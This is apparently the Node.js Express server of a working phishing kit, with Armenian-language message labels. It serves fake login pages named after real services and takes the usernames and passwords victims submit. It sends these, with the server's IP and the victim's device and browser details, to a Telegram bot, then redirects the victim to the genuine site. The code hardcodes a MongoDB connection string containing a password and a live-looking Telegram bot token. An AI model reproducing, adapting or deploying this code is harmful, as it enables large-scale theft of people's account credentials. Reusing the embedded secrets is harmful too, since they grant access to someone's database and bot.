const express = require("express");
const { engine } = require("express-handlebars");
const path = require("path");
const mongoose = require("mongoose")
const axios = require("axios");
const UAParser = require('ua-parser-js');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const userSchema = new mongoose.Schema({
  user_id: String,
  type: String,
  status: String
});

const User = mongoose.model("Phishing", userSchema);

mongoose.connect("mongodb+srv://antonyaneric:Erik$2008@cluster0.hfvu6sp.mongodb.net/graysupport")
  .then(() => console.log("Connected to the database"))
  .catch((err) => console.error("Database connection error:", err));

app.engine("handlebars", engine());
app.set("view engine", "handlebars");
app.set("views", "./views");

app.get("/:id", async (req, res) => {
  const { id } = req.params;
  
  try {
    if (!mongoose.Types.ObjectId.isValid(id)) {
      return res.status(400);
    }

    const user = await User.findById(id);

    if (user) {
      if (user.status === "active") {
        res.render(user.type, { user_id: id });
      } else {
        res.send("<h1>Expired</h1>")
      }
    } else {
      res.sendStatus(404)
    }
  } catch(e) {
    console.log(e)
  }
});

app.post("/send/:id", async (req, res) => {
  const { id } = req.params;
  const {username, password} = req.body
  
  try {
    if (!mongoose.Types.ObjectId.isValid(id)) {
      return res.status(400);
    }

    const user = await User.findById(id);

    if (user) {
      if (user.status === "active") {
        const ipResponse = await axios.get("https://api.ipify.org?format=json")
        const telegramUrl = `https://api.telegram.org/bot7991019559:AAFvtKyGQ8zH-t-Y4DX2qeuFmb03Irqi2TM/sendMessage`;

        const userAgent = req.headers['user-agent'];
        const parser = new UAParser();
        const deviceInfo = parser.setUA(userAgent).getResult();
        console.log(deviceInfo)

        const messageData = {
          chat_id: user.user_id,
          text: `ID: ${user._id}\n\nIP: ${ipResponse.data.ip}\nՕգտանուն կամ Email: ${username}\nԳաղտնաբառ: ${password}\nԾառայություն: ${user.type}\nՍարք: ${deviceInfo.device.model}\nOS: ${deviceInfo.os.name}\nՎերսիա: ${deviceInfo.os.version}\nԲրաուզեր: ${deviceInfo.browser.name}`
        };

        const response = await axios.post(telegramUrl, messageData);

        console.log(response.data);

        res.redirect(`https://www.${user.type}.com`);
      }
    } else {
      res.sendStatus(404)
    }
  } catch(e) {
    console.log(e)
  }
})

app.listen(3000, () => {
  console.log("Server successfully runned...");
});
